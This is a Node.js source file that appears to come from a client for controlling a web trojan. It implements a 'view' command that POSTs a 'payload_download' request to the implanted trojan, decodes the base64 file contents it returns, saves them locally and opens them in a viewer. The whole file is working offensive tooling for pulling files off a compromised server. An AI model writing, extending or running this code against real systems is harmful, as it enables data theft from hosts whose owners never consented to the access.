const errors     = require('./util-http-error');
const fs         = require('fs');
const mime       = require('mime-types');
const path       = require('path');
const shellwords = require('shellwords');
const spawn      = require('child_process').spawn;

module.exports = function(config, req, cmd, callback) {

  // tokenize the input string
  const tokenized = shellwords.split(cmd);
  const src       = tokenized[1];
  const dst       = tokenized[2] || src;

  // assert that src was provided
  if (! src) {

    // assemble an error message
    var err = [
      'Specify a file to view.',
      'Usage: view <remote-filename>'
    ].join('\n');

    return callback(new Error(err));
  }
  
  // initialize the POST body
  const body = {
    cmd : 'payload_download',
    args : {
      file : src,
    },
  };
  
  // POST to the trojan
  req.post({ body : body }, function(err, obj, response) {

    if (err) {
      return callback(err);
    }

    if (obj.statusCode !== 200) {
      return callback(errors(config, obj.statusCode));
    }

    // convert the base64-encoded response to binary
    const data = new Buffer(response.stdout, 'base64');
    const file = path.join(config.global.downloadDir, dst);

    // write the downloaded file to the local filesystem
    fs.writeFile(file, data, function(err) {

      if (err) {
        response.stderr.push(err);
      }

      response.stdout = [ 'File downloaded to ' + file ];

      // determine the appropriate application for viewing the file
      const mimetype = mime.lookup(path.extname(file));
      const viewer   = config.global.viewers[mimetype] || config.global.viewers.default;

      // spawn the viewer as an independent process
      const child = spawn(viewer, [ file ], {
        detached : true,
        stdio    : 'ignore',
      });
      child.unref();

      // let the child process do its own thing, and call back to the REPL
      return callback(null, response);
    });
  });

};
